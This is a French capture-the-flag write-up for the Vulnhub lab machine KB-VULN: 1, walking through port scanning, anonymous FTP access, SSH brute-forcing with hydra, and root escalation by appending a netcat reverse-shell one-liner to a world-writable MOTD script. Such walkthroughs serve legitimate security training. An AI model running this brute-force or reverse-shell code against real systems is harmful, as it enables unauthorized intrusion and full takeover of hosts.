---
layout: default
title: "Writeup KB-VULN: 1 - Vulnhub"
date:   2020-09-05 07:00:00 +0200
published: true
categories:
  - Writeup
---

# Informations sur la box :

* **Difficulté** : Moyenne
* **Description** : *ENUMERATION ENUMERATION and ENUMERATION! This VM is running on VirtualBox. And has 2 flags:user.txt and flag.txt. This works better with VirtualBox rather than VMware*
* **Type de fichier** : .ova (VirtualBox)
* **DHCP** : Activé
* **Lien** : [https://www.vulnhub.com/entry/kb-vuln-1,540/](https://www.vulnhub.com/entry/kb-vuln-1,540/)


### Ce que nous allons aborder dans ce writeup :

*	[Énumération](#énumération)
* 	[Shell basique](#shell-basique)
*	[Privilege escalation](#privilege-escalation)

* * *

## Énumération
* * *

Malgré le fait qu'elle soit classée "medium" cette box peut concurrencer celle de mon [précédent writeup](https://kr0wz.github.io/fr/2020/09/05/writeup-shelldredd.html) en terme de rapiditer à la finir.

On commence à avoir l'habitude avec les étapes du début :

```bash
nmap -sP 192.168.1.0/24
```

On obtient l'adresse IP de la machine à attaquer qui est la suivante : **192.168.1.32**

On scanne ensuite les ports pour trouver ceux qui sont ouverts avec les services qui tournent dessus :

```bash
nmap -sV -p- 192.168.1.32 -O -A --min-rate 5000 -T5
```

* **-sV** : Permet de scanner les services et d'indiquer les versions et les informations correspondantes
* **-p-** : On scan TOUS les ports
* **-O** : Détection de l'OS
* **-A** : Mode aggressif
* **--min-rate 5000** : Définit le nombre d'envoi de paquets par secondes
* **-T5** : Définit le template comme "rapide"

Pour plus d'informations vous pouvez consulter le ``man`` de nmap.

On obtient :

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:84:46:ae:47:21:d1:73:7d:2f:0a:66:87:98:af:d3 (RSA)
|   256 af:79:86:77:00:59:3e:ee:cf:6e:bb:bc:cb:ad:96:cc (ECDSA)
|_  256 9d:4d:2a:a1:65:d4:f2:bd:5b:25:22:ec:bc:6f:66:97 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: OneSchool &mdash; Website by Colorlib
```

Le serveur **FTP** autorise les **connexion anonymes**. On sait donc qu'il y a de grandes chances de trouver quelque chose d'intéressant dessus.

On s'y connecte avec la commande suivante :

```bash
ftp 192.168.1.32
```

On précise l'utilisateur **anonymous** et on laisse le champ du mot de passe vide.

Il n'y a qu'un fichier **.bash_history** qui correspond au fichier dans lequel les commandes entrées par un utilisateur lorsqu'il est sur sa session sont enregistrées. On le récupère via le FTP puis on affiche son contenu

```bash
get .bash_history
exit
cat .bash_history
```
```
exit
ls
cd /etc/update-motd.d/
ls
nano 00-header
exit
```

On obtient l'information de l'existence du fichier ``00-header`` contenu dans le répertoire ``/etc/update-motd.d/``. Il s'agit du **Message Of The Day** (MOTD).

Il est exécuté lorsqu'on se connecte au SSH et contient souvent les informations de la date actuelle et peut être personnalisé.


On se rend du côté du serveur web en lançant notre merveilleux outil **fuff** :

```bash
/opt/ffuf/ffuf -u http://192.168.1.32/FUZZ -w /usr/share/dirb/wordlists/directory-list-2.3-big.txt -e .html,.txt,.php
```

On a pour résultat des dossiers basiques qui n'ont pas grand intérêt à première vue :

```
images                  [Status: 301, Size: 313, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 25578, Words: 6731, Lines: 565]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 312, Words: 20, Lines: 10]
```

On se rend directement sur le site web [http://192.168.1.32](http://192.168.1.32) et on regarde le **code source**. 

Au début rien puis vers la fin on voit un commentaire plutôt intéressant :

```html
<!-- Username : sysadmin -->
```

Ok ! On possède déjà un nom d'utilisateur !

J'ai donc continué d'éplucher toutes les pages du serveur web mais rien d'autre a signaler.

J'ai cru que j'étais tombé sur un fichier important à l'adresse [http://192.168.1.32/fonts/flaticon/backup.txt](http://192.168.1.32/fonts/flaticon/backup.txt) mais après décodé le base 64 il s'agissait simplement d'informations liées à une image.

* * *

## Shell basique

A ce moment nous n'avons qu'un nom d'utilisateur sans mot de passe. Ne serait-ce pas le moment de tenter un **brute force** du serveur SSH ?

Pour ce faire on utilise ``hydra`` avec la commande suivante :

```bash
hydra -l sysadmin -P /usr/share/wordlist/rockyou.txt 192.168.1.32 -t 4 ssh -s 22
```

On indique l'utilisateur que l'on a trouvé précédemment, la wordlist ainsi que le service  brute forcer. Dans notre cas SSH sur le port 22.

Après quelques instants un résultat sort :

```
[22][ssh] host: 192.168.1.32   login: sysadmin   password: password1
```

On peut donc se connecter en SSH avec les identifiants suivants : **sysadmin:password1**

On peut directement récupérer le flag user :

```bash
cat /home/sysadmin/user.txt
```
```
48a365b4ce1e322a55ae9017f3daf0c0
```

* * *

## Privilege escalation

On se souvient du fichier qui était dans le FTP : **.bash_history**                                                                                                                                    
Allons voir les droits du fichier qui contient le ``motd`` :

```bash
ls -la /etc/update-motd.d/00-header

-rwxrwxrwx 1 root root 1074 Sep  6 08:12 /etc/update-motd.d/00-header
```

Très bonne nouvelle : on peut le **modifier** !

Comme dit précédement ce fichier est exécuté en tant que root à chaque fois qu'une session SSH est ouverte. 

De ce fait il nous suffit d'y ajouter un reverse shell, de quitter la session et de s'y reconnecter pour obtenir un accès root sur la machine :

```bash
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.1.16 4444 >/tmp/f" >> /etc/update-motd.d/00-header
```

De notre côté un se met en mode écoute avec ``nc`` :

```bash
nc -lnvp 4444
```

On se reconnecte avec SSH et magie ! Nous sommes root.

Il ne nous reste plus qu'à récupérer le dernier flag :

```bash
cat /root/flag.txt
```
```
1eedddf9fff436e6648b5e51cb0d2ec7
```

Cette box n'était pas très compliquée mais bien fun à faire :)

Merci à **MachineBoy** pour avoir créé et partagé cette machine !